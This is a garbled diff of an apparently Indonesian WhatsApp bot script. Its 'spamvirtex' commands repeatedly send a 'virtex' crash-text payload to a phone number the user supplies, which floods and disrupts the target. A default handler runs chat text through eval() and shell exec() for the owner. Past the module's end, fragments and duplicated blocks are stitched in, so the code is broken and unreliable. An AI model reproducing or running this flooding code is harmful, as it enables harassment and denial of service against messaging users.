-𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}style [teks]
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}style Gw anak sultan
-
-   *き⃟🔍 [query]*
-Masukan teks yang ingin di cari atau yang ingin di dapatkan
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}play [query]
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}play melukis senja
-
-   *き⃟🔍 [url]*
-Masukan url setelah command
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}ytmp4 [url]
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}ytmp4 https://youtu.be/KTrEsj20lWM
-
-   *き⃟🔍 [nomor]*
-Masukan nomor hp
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}add [nomor]
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}add ${global.pemilik}
-
-   き⃟🔍 _Reply image_
-   き⃟🔍 _Reply Foto_
- Reply Pesan berupa Foto dengan teks pesan command
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 : ${prefix}setppbot _Reply image_
-𝑪𝑶𝑵𝑻𝑶𝑯 𝑷𝑬𝑵𝑮𝑮𝑼𝑵𝑨𝑨𝑵: ${prefix}setppbot (sambil membalas pesan berisi Foto)
-
-
-𝗠𝗔𝗦𝗜𝗛 𝗕𝗜𝗡𝗚𝗨𝗡𝗚?
- Jika masih bingung dengan argumen command, ketikan saja command nya, nanti muncul tutorial penggunaan dan contoh penggunaan nya
- 𝑪𝑶𝑵𝑻𝑶𝑯 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 :${prefix}ytkomen [username+comment] _Reply image_
- 
- MAKA KETIKAN SAJA ${prefix}ytkomen
-NANTI BAKAL MUNCUL CARA PENGGUNAANNYA DAN CONTOH PENGGUNAANNYA  `)
-          }
-          break
 
 
 
@@ -8165,7 +4589,8 @@ NANTI BAKAL MUNCUL CARA PENGGUNAANNYA DAN CONTOH PENGGUNAANNYA  `)
 
 
 
-case 'okvirtex': {
+
+case '7okvirtex': {
 	if (!isCreator) return reply(mess.owner)
             	anu = `${global.virtex}\n${global.virtex}`
   let message = await prepareWAMessageMedia({ video: fs.readFileSync('./media/menu.mp4'), gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
@@ -8215,7 +4640,7 @@ case 'okvirtex': {
   
 break
 
-case 'spamvirtex': {
+case '7spamvirtex': {
 	if (!isCreator) return reply(mess.owner)
 	if (!text) throw `*Masukan nomor yg mau di spam virtex !*\n\n_Contoh:_ ${prefix + command} 628xxxxxxxxx`
 	let buttons = [
@@ -8232,7 +4657,7 @@ case 'spamvirtex': {
 }
 
 break
-case 'spamvirtex2': {
+case '7spamvirtex2': {
 tas = arg.split('+')[0]
               wah = arg.split('+')[1]
 	if (!isCreator) return reply(mess.owner)
@@ -8337,7 +4762,7 @@ let message = await prepareWAMessageMedia({ video: fs.readFileSync('./media/menu
 
 
 
-case '404menu': {
+case '7404menu': {
             	anu = ` 
             
   `
@@ -8366,7 +4791,167 @@ case '404menu': {
             }
 break
 
-case 'energycontribution': case 'tqtt': case 'tqto': case 'thanksto': case 'thankto': 
+case '7energycontribution': case '7tqtt': case '7tqto': case '7thanksto': case '7thankto': 
+m.reply(global.tqto)
+break
+
+//GET EMAIL TEMPORARY
+
+
+
+ default:
+                if (budy.startsWith('=>')) {
+                    if (!isCreator) return reply(mess.owner)
+                    function Return(sul) {
+                        sat = JSON.stringify(sul, null, 2)
+                        bang = util.format(sat)
+                            if (sat == undefined) {
+                                bang = util.format(sul)
+                            }
+                            return reply(bang)
+                    }
+                    try {
+                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+                    } catch (e) {
+                        reply(String(e))
+                    }
+                }
+
+                if (budy.startsWith('>')) {
+                    if (!isCreator) return reply(mess.owner)
+                    try {
+                        let evaled = await eval(budy.slice(2))
+                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+                        await reply(evaled)
+                    } catch (err) {
+                        await reply(String(err))
+                      
+                   }
+                }
+
+                if (budy.startsWith('$')) {
+                    if (!isCreator) return reply(mess.owner)
+                    exec(budy.slice(2), (err, stdout) => {
+                        if(err) return reply(err)
+                        if (stdout) return reply(stdout)
+                    })
+                }
+			
+		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
+                    this.anonymous = this.anonymous ? this.anonymous : {}
+                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
+                    if (room) {
+                        if (/^.*(next|leave|start)/.test(m.text)) return
+                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
+                        let other = [room.a, room.b].find(user => user !== m.sender)
+                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
+                            contextInfo: {
+                                ...m.msg.contextInfo,
+                                forwardingScore: 0,
+                                isForwarded: true,
+                                participant: other
+                            }
+                        } : {})
+                    }
+                    return !0
+                }
+			
+		if (isCmd && budy.toLowerCase() != undefined) {
+		   if (m.chat.endsWith('broadcast')) return
+		    if (m.isBaileys) return
+		    let msgs = global.db.database
+		    if (!(budy.toLowerCase() in msgs)) return
+		   XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+		}
+        }
+        
+
+    } catch (err) {
+        m.reply(util.format(err))
+    }
+}
+
+
+let file = require.resolve(__filename)
+fs.watchFile(file, () => {
+	fs.unwatchFile(file)
+	console.log(chalk.redBright(`Update ${__filename}`))
+	delete require.cache[file]
+	require(file)
+})
+)
+obal.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+            await sleep(3000)            
+               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+             await sleep(3000)            
+              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
+              await sleep(3000)            
+               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+          XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+            await sleep(3000)            
+               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                await sleep(3000)            
+               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+            await sleep(3000)            
+               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+             await sleep(3000)            
+              XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+                XeonBotInc.relayMessage(`${wah}@s.whatsapp.net`, template.message, { messageId: template.key.id })
+              await sleep(3000)            
+               XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://chat.whatsapp.com/${global.virtex}`}}})
+                XeonBotInc.sendMessage(`${wah}@s.whatsapp.net`, { text: ` ${global.virtex}\n${global.virtex}`, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `https://YouTube.com/${global.virtex}`}}})
+          }
+          
+          break
+
+
+
+
+case '7404menu': {
+            	anu = ` 
+            
+  `
+  let message = await prepareWAMessageMedia({ video: fs.readFileSync('./BotMedia/menu.mp4'), gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
+     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+     templateMessage: {
+         hydratedTemplate: {
+           videoMessage: message.videoMessage,
+           hydratedContentText: anu,
+           hydratedFooterText: `${global.fake}`,
+           hydratedButtons: [{
+                                urlButton: {
+                                    displayText: 'YouTube📍',
+                                    url: 'https://youtu.be/imFIX-Wrt3s'
+                                }
+                            }, {
+                                quickReplyButton: {
+                                    displayText: '👤Owner👤',
+                                    id: `${prefix}owner`
+                                }
+                            }]
+                        }
+                    }
+                }), { userJid: m.chat })
+                XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
+            }
+break
+
+case '7energycontribution': case '7tqtt': case '7tqto': case '7thanksto': case '7thankto': 
 m.reply(global.tqto)
 break
 
